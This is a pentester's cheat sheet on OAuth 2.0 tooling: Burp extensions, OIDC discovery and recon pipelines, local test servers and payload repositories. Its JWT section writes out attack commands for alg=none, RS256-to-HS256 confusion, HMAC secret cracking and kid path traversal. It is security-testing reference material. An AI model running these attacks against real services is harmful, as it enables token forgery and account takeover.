---
aliases:
  - OAuth Tooling
  - EsPReSSO
  - jwt_tool
  - Keycloak Test
tags:
  - vuln/oauth
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[OAuth 2.0 Misconfigurations]]"
  - "[[Burp Suite]]"
  - "[[JWT Attacks]]"
---
# OAuth 2.0 - Tooling

***

## Burp Suite + Extensions

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Extensions → BApp Store → "EsPReSSO" → Install | Auto-detect OAuth/SAML, parse tokens, scan vulns | OAuth flow audit. |
| Burp → Extensions → BApp Store → "JSON Web Tokens" → Install | Decode/edit JWTs in-place en Repeater | Manipular id_token / access_token. |
| Burp → Extensions → BApp Store → "Param Miner" → Install | Discover hidden params en authorize/token | Recon scope/redirect. |
| Burp → Extensions → BApp Store → "Authz" → Install | Test scope/role escalations automatizados | Scope escalation. |
| Burp Repeater → modificar `redirect_uri`/`state`/`response_type`/`scope` y replay | Manual flow manipulation | Standard manual testing. |
| Burp Intruder con wordlist parser-confusion → fuzz `redirect_uri` | Bulk redirect_uri bypass test | Brute parser tricks. |
| Burp Comparer → diff de responses con/sin `state` | Detecta validación state ausente | Session-bind check. |
| Burp Settings → Match & Replace → mod `redirect_uri` global | Reescritura automática del flow | Workflow continuo. |
| Burp Pro → Authentication Recorder → grabar full OAuth flow como macro | Replay flows complejos | Multi-step automation. |
^oauth-tool-burp

___

## CLI y Discovery

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -s https://target/.well-known/openid-configuration \| jq .` | Discovery completo (issuer, endpoints, supported flows) | Recon inicial OIDC. |
| `curl -s https://target/.well-known/oauth-authorization-server \| jq .` | OAuth 2.0 discovery (RFC 8414) | Recon OAuth puro. |
| `curl -s https://target/.well-known/openid-configuration \| jq '.jwks_uri' \| xargs curl -s \| jq .` | JWKS público | JWT signature verification. |
| `subfinder -d known.com -silent \| httpx -silent -path /.well-known/openid-configuration -mc 200` | Bulk OIDC endpoint discovery | Multi-host recon. |
| `nuclei -u target -t http/exposures/oauth*` | Templates dedicados a OAuth misconfigs | Auto-scan vulns. |
| `katana -u https://target -jc \| grep -E 'client_id\|oauth\|authorize'` | Crawl JS bundles y extraer client_ids | Frontend recon. |
| `gau target.com \| grep -E 'oauth\|authorize\|client_id\|redirect_uri'` | URLs históricas de archive.org | Historical client_ids. |
| `waybackurls target.com \| grep oauth` | Same — variante | Historical. |
| `git clone https://github.com/dafthack/oauth-toolkit && python oauth-toolkit.py -u target` | Bulk OAuth misconfig testing | Comprehensive scan. |
^oauth-tool-cli

### Bulk discovery pipeline

```bash
# Subdomains + OAuth discovery + key endpoints
subfinder -d known.com -silent | \
  httpx -silent -path /.well-known/openid-configuration -mc 200 | \
  while read url; do
    echo "=== $url ==="
    curl -s "$url" | jq '{
      issuer,
      authorization_endpoint,
      token_endpoint,
      registration_endpoint,
      response_types_supported,
      grant_types_supported,
      code_challenge_methods_supported,
      token_endpoint_auth_methods_supported
    }'
  done
```

___

## JWT-specific Tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `jwt-cli decode $JWT` | Decode local sin enviar a sitio público | Análisis sin leak. |
| `python3 jwt_tool.py $JWT` | Suite completa attacks | Multi-vector. |
| `python3 jwt_tool.py $JWT -X a` | alg=none attack | Server acepta `alg:none`. |
| `python3 jwt_tool.py $JWT -X k -pk pubkey.pem` | RS256 → HS256 confusion (necesita pubkey RSA) | HMAC confusion bug. |
| `python3 jwt_tool.py $JWT -C -d wordlist.txt` | HMAC brute force secret | Weak HMAC secret. |
| `python3 jwt_tool.py $JWT -X i -I -hc kid -hv "../../tmp/x"` | kid path traversal injection | kid header inject. |
| `hashcat -m 16500 jwt.txt rockyou.txt` | GPU brute HMAC | Faster que jwt_tool. |
| `openssl ec -pubin -in key.pem -text -noout` | Inspeccionar key pública | Key analysis. |
| `curl -s $JWKS_URI \| jq '.keys[] \| .kid'` | Lista kids del JWKS | Pre-attack kid inject. |
^oauth-tool-jwt

### JWT attack quick checks

```bash
# Decode local
echo "$JWT" | jwt-cli decode

# alg=none test
python3 jwt_tool.py "$JWT" -X a

# HMAC crack
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt

# RS256 → HS256 confusion (need server's RSA pubkey)
python3 jwt_tool.py "$JWT" -X k -pk pubkey.pem
```

___

## Test Servers / Sandboxes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `docker run --rm -p 8080:8080 -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak:latest start-dev` | Keycloak full IdP en local | Test attacks contra Keycloak. |
| `docker run -p 4444:4444 oryd/hydra:latest serve all --dev` | ory/hydra OAuth2 lightweight | Test contra hydra. |
| Browser → https://oauth.tools | Online OAuth flow inspector | Quick visualization. |
| Browser → https://openidconnect.net/playground | OIDC interactive playground | OIDC learning. |
| `docker run -p 8080:8080 webgoat/webgoat-8.0` | OWASP labs locales | Practice. |
| `docker run -p 3000:3000 bkimminich/juice-shop` | OWASP Juice Shop | Modern app + OAuth labs. |
| Browser → https://portswigger.net/web-security/oauth | PortSwigger Academy 5 labs OAuth | Hands-on free. |
^oauth-tool-sandbox

### Keycloak quick-start completo

```bash
# Run
docker run --rm -p 8080:8080 \
  -e KEYCLOAK_ADMIN=admin \
  -e KEYCLOAK_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:latest start-dev

# Console: http://localhost:8080
# 1. Create realm "test"
# 2. Create client → enable PKCE
# 3. Test attacks: redirect_uri parser, state replay, scope upgrade
```

___

## Wordlists & Payload Repos

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && cd PayloadsAllTheThings/OAuth\ Misconfiguration` | Payloads bypass redirect_uri + tricks | Foundation wordlist. |
| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/OAuth%20Misconfiguration/Intruder/redirect_uri_bypass.txt` | Lista redirect_uri bypass payloads ready | Burp Intruder. |
| Browser → https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover | HackTricks reference completo | Lookup. |
| Browser → https://hackerone.com/hacktivity?querystring=oauth | Disclosed real-world OAuth chains | Inspiration. |
| Browser → https://datatracker.ietf.org/doc/html/rfc6819 | RFC 6819 threat model oficial | Threat catalog. |
| Browser → https://datatracker.ietf.org/doc/html/rfc9700 | RFC 9700 OAuth Best Practices 2025 | Modern guidance. |
| Browser → https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html | OWASP defense reference | Mitigations. |
^oauth-tool-wordlists

***
